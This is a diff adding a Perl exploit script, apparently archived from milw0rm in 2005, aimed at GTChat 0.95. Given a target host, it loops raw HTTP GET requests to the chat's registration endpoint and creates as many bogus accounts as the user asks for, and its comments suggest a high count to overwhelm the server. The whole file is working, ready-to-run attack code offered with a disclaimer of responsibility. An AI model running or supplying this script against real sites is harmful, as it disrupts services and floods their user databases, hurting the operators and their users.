@@ -1,0 +1,46 @@
+# Use a high user # for best results. /str0ke
+
+#!/usr/bin/perl
+######################
+# codez0red by VTECin5th #
+# Feel free to modify/break this script #
+# Crappy code is more effective =] #
+# I accept no responsibility for misuse or abuse #
+######################
+# Usage: xxx.pl www.server.com /directory_to_chat/ #_of_users_to_create
+######################
+# Affected Software: GTChat .95
+# Unaffected Software: GTChat .93
+######################
+use IO::Socket;
+if (@ARGV < 2){
+print "Usage:\n xxx.pl www.server.com /Path_to_GTChat/ #_of_users_to_create\n";
+print "Example:\n xxx.pl www.serfer.com /GTChat/cgi-bin/ 5";
+exit;
+}
+$dir = $ARGV[1];
+$numero = $ARGV[2];
+$host = $ARGV[0];
+$host =~ s/http\:\/\///gi;
+for ($i = 1; $i <= $numero; $i++) {
+$rando = int(rand(234));
+$randy = int(rand(12));
+$whyThem = $randy . $rando . "@" . $randy . ".com";
+$whyMe = "SoSorry" . $rando . $randy;
+$lol = "$dir/chat.pl?action=register&name=$whyMe&password=$whyMe&password2=$whyMe&email=$whyThem&privateemail=0";
+$ox=IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>80,Proto=>'tcp') || die "Oh No! You broke teh server!";
+print $ox "GET $lol HTTP/1.1\r\n";
+print $ox "Accept: */*\r\n";
+print $ox "Accept-Language: pt\r\n";
+print $ox "Accept-Encoding: gzip, deflate\r\n";
+print $ox "User-Agent: 1337 pwnz0r\r\n";
+print $ox "Host: $host\r\n";
+print $ox "Connection: Keep-Alive\r\n\r\n\r\n";
+print "currently on: $whyMe \t ($i)\n";
+# Please note, this does not verify whether or not the user is actually being created.
+# I assume you know how to use this script.
+}
+print "Finished creating $numero users";
+close($ox);
+
+# milw0rm.com [2005-08-23]
